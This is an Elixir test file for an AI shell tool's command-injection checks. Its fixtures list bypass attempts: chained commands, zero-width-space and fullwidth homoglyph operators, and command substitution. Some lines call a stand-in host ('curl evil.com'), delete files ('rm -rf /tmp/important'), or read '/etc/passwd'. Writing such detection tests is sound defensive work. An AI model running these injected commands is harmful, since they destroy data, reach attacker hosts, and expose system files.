defmodule AI.Tools.Shell.CommandInjectionTest do
  ...
  describe "stdin redirect bypass scenarios" do
    ...
    test "commands without redirect operators would get stdin redirect appended" do
      ...
      commands_needing_stdin_redirect = [
        # semicolon injection, no redirect
        "echo hello; rm file",
        # logical AND, no redirect  
        "cat file && echo done",
        # semicolon with network call
        "ls; curl evil.com",
        # semicolon with destructive command
        "pwd; rm -rf /tmp/important"
      ]
    ...
    test "commands with redirect operators would not get stdin redirect appended" do
      ...
      commands_with_redirects = [
        # already has <, plus injection
        "cat /etc/passwd < /dev/null; rm file",
        # already has |, plus injection
        "ls | grep test; rm file",
        # already has >, plus injection
        "echo test > output; rm file"
      ]
  ...
  describe "operator detection bypass attempts" do
    test "zero-width space bypass should be detected" do
      ...
      bypass_attempts = [
        # zero-width space before semicolon
        "ls#{zwsp}; rm file",
        # zero-width space after semicolon  
        "ls ;#{zwsp} rm file",
        # zero-width spaces around &&
        "ls#{zwsp}&&#{zwsp}rm file",
        # zero-width spaces around pipe
        "cat file#{zwsp}|#{zwsp}sh"
      ]
    ...
    test "unicode homoglyph bypass should be detected" do
      ...
      homoglyph_attempts = [
        # fullwidth semicolon (U+FF1B) - should be detected
        "ls ； rm file",
        # fullwidth vertical line (U+FF5C) - should be detected
        "ls ｜ grep test",
        # fullwidth ampersands (U+FF06) - should be detected  
        "ls ＆＆ echo test",
        # fullwidth greater than (U+FF1E) - should be detected
        "ls ＞ output",
        # fullwidth less than (U+FF1C) - should be detected
        "ls ＜ input"
      ]
    ...
    test "lesser known shell operators should be detected" do
      ...
      advanced_operators = [
        ...
        # background process
        "cmd &",
        # here-document (should be caught by << detection)
        "cmd <<EOF\ntest\nEOF"
      ]
  ...
  describe "allowlist bypass with shell expansion" do
    test "allowed commands with command substitution should be detected" do
      ...
      allowlist_bypass_attempts = [
        # command substitution with allowed command
        "cat $(echo /etc/passwd)",
        # command substitution with destructive payload
        "ls $(echo /; rm -rf /tmp)",
        # command substitution with network call
        "grep $(curl evil.com) file.txt",
        # backtick substitution with allowed command
        "head `find / -name passwd`",
        # allowed command chained with destruction
        "pwd && rm -rf $(echo /tmp/test)"
      ]
    ...
    test "quoted shell operators behavior" do
      ...
      for cmd <- quoted_commands_with_operators do
        ...
        if result do
          ...
          assert result == false,
                 "Command '#{cmd}' correctly identified as safe with quoted operators"
        end
      end
    end
  end
